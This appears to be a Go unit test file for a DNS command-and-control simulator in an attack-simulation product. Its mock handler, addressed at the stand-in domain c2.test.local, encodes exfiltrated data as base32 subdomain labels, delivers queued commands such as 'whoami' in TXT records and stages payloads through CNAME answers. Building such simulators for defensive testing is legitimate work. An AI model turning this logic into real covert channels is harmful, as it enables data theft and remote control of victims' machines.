// Mirqab Cloud Relay - C2 DNS Simulator Unit Tests
package unit

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/miekg/dns"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// Test configuration
type DNSTestConfig struct {
	DNSPort       int
	TenantID      string
	BaseDomain    string
	MaxSessionAge time.Duration
}

func defaultDNSTestConfig() *DNSTestConfig {
	return &DNSTestConfig{
		DNSPort:       5353,
		TenantID:      "test-tenant-001",
		BaseDomain:    "c2.test.local",
		MaxSessionAge: 30 * time.Minute,
	}
}

// Mock DNS handler for testing
type MockDNSHandler struct {
	config   *DNSTestConfig
	sessions map[string]*MockDNSSession
}

type MockDNSSession struct {
	ID         string
	AgentID    string
	QueryCount int
	DataBuffer []byte
}

func NewMockDNSHandler(config *DNSTestConfig) *MockDNSHandler {
	return &MockDNSHandler{
		config:   config,
		sessions: make(map[string]*MockDNSSession),
	}
}

// Test: A Record - Simple beacon check-in
func TestARecordBeaconCheckin(t *testing.T) {
	config := defaultDNSTestConfig()
	handler := NewMockDNSHandler(config)

	// Create DNS query for simple check-in
	// Format: <agent_id>.<base_domain>
	qname := "agent123." + config.BaseDomain + "."

	m := new(dns.Msg)
	m.SetQuestion(qname, dns.TypeA)

	response := handler.handleARecord(m)

	require.NotNil(t, response)
	require.Len(t, response.Answer, 1)

	aRecord, ok := response.Answer[0].(*dns.A)
	require.True(t, ok, "Expected A record")

	// First octet indicates status (1=active, 2=pending command)
	assert.Equal(t, byte(1), aRecord.A[0], "First octet should indicate active status")
}

// Test: A Record - Data exfiltration
func TestARecordDataExfiltration(t *testing.T) {
	config := defaultDNSTestConfig()
	handler := NewMockDNSHandler(config)

	// Encode test data using base32 (DNS-safe)
	testData := []byte("secret-exfil-data")
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(testData)
	encoded = strings.ToLower(encoded)

	// Format: <encoded_data>.<session_id>.<base_domain>
	qname := encoded + ".agent123." + config.BaseDomain + "."

	m := new(dns.Msg)
	m.SetQuestion(qname, dns.TypeA)

	response := handler.handleARecord(m)

	require.NotNil(t, response)
	require.Len(t, response.Answer, 1)

	// Check session received data
	session := handler.sessions["agent123"]
	require.NotNil(t, session)
	assert.Equal(t, testData, session.DataBuffer)
}

// Test: TXT Record - Command retrieval
func TestTXTRecordCommandRetrieval(t *testing.T) {
	config := defaultDNSTestConfig()
	handler := NewMockDNSHandler(config)

	// Pre-queue a command
	handler.sessions["agent456"] = &MockDNSSession{
		ID:      "session-456",
		AgentID: "agent456",
	}
	handler.queueCommand("agent456", "whoami")

	qname := "agent456." + config.BaseDomain + "."

	m := new(dns.Msg)
	m.SetQuestion(qname, dns.TypeTXT)

	response := handler.handleTXTRecord(m)

	require.NotNil(t, response)
	require.Len(t, response.Answer, 1)

	txtRecord, ok := response.Answer[0].(*dns.TXT)
	require.True(t, ok, "Expected TXT record")

	// Decode base64 response
	decoded, err := base64.StdEncoding.DecodeString(strings.Join(txtRecord.Txt, ""))
	require.NoError(t, err)

	var commands []string
	err = json.Unmarshal(decoded, &commands)
	require.NoError(t, err)

	assert.Contains(t, commands, "whoami")
}

// Test: AAAA Record - Larger data chunks
func TestAAAARecordDataExfiltration(t *testing.T) {
	config := defaultDNSTestConfig()
	handler := NewMockDNSHandler(config)

	// Larger data chunk (AAAA can handle more)
	testData := []byte("larger-data-chunk-for-exfiltration-testing-1234567890")
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(testData)
	encoded = strings.ToLower(encoded)

	qname := encoded + ".agent789." + config.BaseDomain + "."

	m := new(dns.Msg)
	m.SetQuestion(qname, dns.TypeAAAA)

	response := handler.handleAAAARecord(m)

	require.NotNil(t, response)
	require.Len(t, response.Answer, 1)

	_, ok := response.Answer[0].(*dns.AAAA)
	require.True(t, ok, "Expected AAAA record")

	// Verify data was captured
	session := handler.sessions["agent789"]
	require.NotNil(t, session)
	assert.Equal(t, testData, session.DataBuffer)
}

// Test: CNAME Record - Payload staging
func TestCNAMERecordPayloadStaging(t *testing.T) {
	config := defaultDNSTestConfig()
	handler := NewMockDNSHandler(config)

	qname := "payload123." + config.BaseDomain + "."

	m := new(dns.Msg)
	m.SetQuestion(qname, dns.TypeCNAME)

	response := handler.handleCNAMERecord(m)

	require.NotNil(t, response)
	require.Len(t, response.Answer, 1)

	cnameRecord, ok := response.Answer[0].(*dns.CNAME)
	require.True(t, ok, "Expected CNAME record")

	// Target should point to CDN-style domain
	assert.Contains(t, cnameRecord.Target, "cdn.")
	assert.Contains(t, cnameRecord.Target, config.BaseDomain)
}

// Test: MX Record - Alternative channel
func TestMXRecordAlternativeChannel(t *testing.T) {
	config := defaultDNSTestConfig()
	handler := NewMockDNSHandler(config)

	qname := config.BaseDomain + "."

	m := new(dns.Msg)
	m.SetQuestion(qname, dns.TypeMX)

	response := handler.handleMXRecord(m)

	require.NotNil(t, response)
	require.Len(t, response.Answer, 1)

	mxRecord, ok := response.Answer[0].(*dns.MX)
	require.True(t, ok, "Expected MX record")

	assert.Equal(t, uint16(10), mxRecord.Preference)
	assert.Contains(t, mxRecord.Mx, "mail.")
}

// Test: NXDOMAIN for unknown domain
func TestNXDOMAINForUnknownDomain(t *testing.T) {
	config := defaultDNSTestConfig()
	handler := NewMockDNSHandler(config)

	// Query for a domain we don't own
	qname := "agent123.unknown.domain."

	m := new(dns.Msg)
	m.SetQuestion(qname, dns.TypeA)

	response := handler.handleQuery(m)

	assert.Equal(t, dns.RcodeNameError, response.Rcode)
}

// Test: Session persistence across queries
func TestDNSSessionPersistence(t *testing.T) {
	config := defaultDNSTestConfig()
	handler := NewMockDNSHandler(config)

	agentID := "persist-agent"

	// First query
	qname1 := agentID + "." + config.BaseDomain + "."
	m1 := new(dns.Msg)
	m1.SetQuestion(qname1, dns.TypeA)
	handler.handleARecord(m1)

	// Second query
	m2 := new(dns.Msg)
	m2.SetQuestion(qname1, dns.TypeA)
	handler.handleARecord(m2)

	// Should have only one session
	assert.Len(t, handler.sessions, 1)

	// Query count should be 2
	session := handler.sessions[agentID]
	assert.Equal(t, 2, session.QueryCount)
}

// Test: Base32 encoding validation
func TestBase32EncodingValidation(t *testing.T) {
	testCases := []struct {
		name     string
		data     string
		valid    bool
	}{
		{"valid base32", "JBSWY3DPEHPK3PXP", true},
		{"lowercase valid", "jbswy3dpehpk3pxp", true},
		{"invalid chars", "invalid!!!", false},
		{"empty", "", true},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(tc.data))
			if tc.valid {
				assert.NoError(t, err)
			} else {
				assert.Error(t, err)
			}
		})
	}
}

// Test: TXT record splitting for long data
func TestTXTRecordSplitting(t *testing.T) {
	// TXT records have max 255 chars per string
	longData := strings.Repeat("A", 500)

	split := splitTXTRecord(longData, 255)

	assert.Len(t, split, 2)
	assert.Len(t, split[0], 255)
	assert.Len(t, split[1], 245)
}

// Test: Concurrent query handling
func TestConcurrentQueries(t *testing.T) {
	config := defaultDNSTestConfig()
	handler := NewMockDNSHandler(config)

	// Simulate 10 concurrent agents
	for i := 0; i < 10; i++ {
		agentID := "agent-" + string(rune('A'+i))
		qname := agentID + "." + config.BaseDomain + "."

		m := new(dns.Msg)
		m.SetQuestion(qname, dns.TypeA)
		handler.handleARecord(m)
	}

	assert.Len(t, handler.sessions, 10)
}

// Test: Command queue FIFO
func TestCommandQueueFIFO(t *testing.T) {
	config := defaultDNSTestConfig()
	handler := NewMockDNSHandler(config)

	handler.sessions["fifo-agent"] = &MockDNSSession{
		ID:      "session-fifo",
		AgentID: "fifo-agent",
	}

	// Queue commands
	handler.queueCommand("fifo-agent", "cmd1")
	handler.queueCommand("fifo-agent", "cmd2")
	handler.queueCommand("fifo-agent", "cmd3")

	// Retrieve commands
	commands := handler.getPendingCommands("fifo-agent")

	assert.Equal(t, []string{"cmd1", "cmd2", "cmd3"}, commands)

	// Queue should be empty after retrieval
	commands = handler.getPendingCommands("fifo-agent")
	assert.Len(t, commands, 0)
}

// Mock DNS handler methods
func (h *MockDNSHandler) handleQuery(m *dns.Msg) *dns.Msg {
	response := new(dns.Msg)
	response.SetReply(m)

	if len(m.Question) == 0 {
		return response
	}

	q := m.Question[0]
	qname := strings.ToLower(q.Name)

	// Check if it's our domain
	if !strings.HasSuffix(qname, h.config.BaseDomain+".") {
		response.Rcode = dns.RcodeNameError
		return response
	}

	return response
}

func (h *MockDNSHandler) handleARecord(m *dns.Msg) *dns.Msg {
	response := new(dns.Msg)
	response.SetReply(m)

	q := m.Question[0]
	qname := strings.ToLower(q.Name)

	parts := strings.Split(strings.TrimSuffix(qname, "."+h.config.BaseDomain+"."), ".")

	var agentID string
	var data []byte

	if len(parts) >= 2 {
		// Data exfiltration
		encoded := parts[0]
		agentID = parts[1]
		decoded, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(encoded))
		if err == nil {
			data = decoded
		}
	} else if len(parts) == 1 {
		// Simple check-in
		agentID = parts[0]
	}

	// Get or create session
	session, exists := h.sessions[agentID]
	if !exists {
		session = &MockDNSSession{
			ID:         "sess-" + agentID[:4],
			AgentID:    agentID,
			QueryCount: 0,
			DataBuffer: []byte{},
		}
		h.sessions[agentID] = session
	}

	session.QueryCount++
	if len(data) > 0 {
		session.DataBuffer = append(session.DataBuffer, data...)
	}

	// Create response IP
	status := byte(1)
	ip := net.IPv4(status, byte(session.QueryCount), 0, byte(len(data)))

	rr := &dns.A{
		Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
		A:   ip,
	}
	response.Answer = append(response.Answer, rr)

	return response
}

func (h *MockDNSHandler) handleAAAARecord(m *dns.Msg) *dns.Msg {
	response := new(dns.Msg)
	response.SetReply(m)

	q := m.Question[0]
	qname := strings.ToLower(q.Name)

	parts := strings.Split(strings.TrimSuffix(qname, "."+h.config.BaseDomain+"."), ".")

	if len(parts) >= 2 {
		encoded := parts[0]
		agentID := parts[1]

		decoded, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(encoded))
		if err == nil {
			session, exists := h.sessions[agentID]
			if !exists {
				session = &MockDNSSession{
					ID:         "sess-" + agentID[:4],
					AgentID:    agentID,
					DataBuffer: []byte{},
				}
				h.sessions[agentID] = session
			}
			session.DataBuffer = append(session.DataBuffer, decoded...)
		}
	}

	ip := net.ParseIP("2001:db8::1")
	rr := &dns.AAAA{
		Hdr:  dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: 60},
		AAAA: ip,
	}
	response.Answer = append(response.Answer, rr)

	return response
}

func (h *MockDNSHandler) handleTXTRecord(m *dns.Msg) *dns.Msg {
	response := new(dns.Msg)
	response.SetReply(m)

	q := m.Question[0]
	qname := strings.ToLower(q.Name)

	parts := strings.Split(strings.TrimSuffix(qname, "."+h.config.BaseDomain+"."), ".")
	if len(parts) < 1 {
		return response
	}

	agentID := parts[0]
	commands := h.getPendingCommands(agentID)

	var txtValue string
	if len(commands) > 0 {
		cmdData, _ := json.Marshal(commands)
		txtValue = base64.StdEncoding.EncodeToString(cmdData)
	} else {
		txtValue = base64.StdEncoding.EncodeToString([]byte(`{"status":"active"}`))
	}

	rr := &dns.TXT{
		Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 60},
		Txt: splitTXTRecord(txtValue, 255),
	}
	response.Answer = append(response.Answer, rr)

	return response
}

func (h *MockDNSHandler) handleCNAMERecord(m *dns.Msg) *dns.Msg {
	response := new(dns.Msg)
	response.SetReply(m)

	q := m.Question[0]
	qname := strings.ToLower(q.Name)

	parts := strings.Split(strings.TrimSuffix(qname, "."+h.config.BaseDomain+"."), ".")
	target := "payload-" + parts[0] + ".cdn." + h.config.BaseDomain + "."

	rr := &dns.CNAME{
		Hdr:    dns.RR_Header{Name: q.Name, Rrtype: dns.TypeCNAME, Class: dns.ClassINET, Ttl: 300},
		Target: target,
	}
	response.Answer = append(response.Answer, rr)

	return response
}

func (h *MockDNSHandler) handleMXRecord(m *dns.Msg) *dns.Msg {
	response := new(dns.Msg)
	response.SetReply(m)

	q := m.Question[0]

	rr := &dns.MX{
		Hdr:        dns.RR_Header{Name: q.Name, Rrtype: dns.TypeMX, Class: dns.ClassINET, Ttl: 3600},
		Preference: 10,
		Mx:         "mail." + h.config.BaseDomain + ".",
	}
	response.Answer = append(response.Answer, rr)

	return response
}

var commandQueues = make(map[string][]string)

func (h *MockDNSHandler) queueCommand(agentID string, command string) {
	if _, exists := commandQueues[agentID]; !exists {
		commandQueues[agentID] = []string{}
	}
	commandQueues[agentID] = append(commandQueues[agentID], command)
}

func (h *MockDNSHandler) getPendingCommands(agentID string) []string {
	if commands, exists := commandQueues[agentID]; exists {
		commandQueues[agentID] = []string{}
		return commands
	}
	return nil
}

func splitTXTRecord(s string, maxLen int) []string {
	var result []string
	for len(s) > maxLen {
		result = append(result, s[:maxLen])
		s = s[maxLen:]
	}
	if len(s) > 0 {
		result = append(result, s)
	}
	return result
}
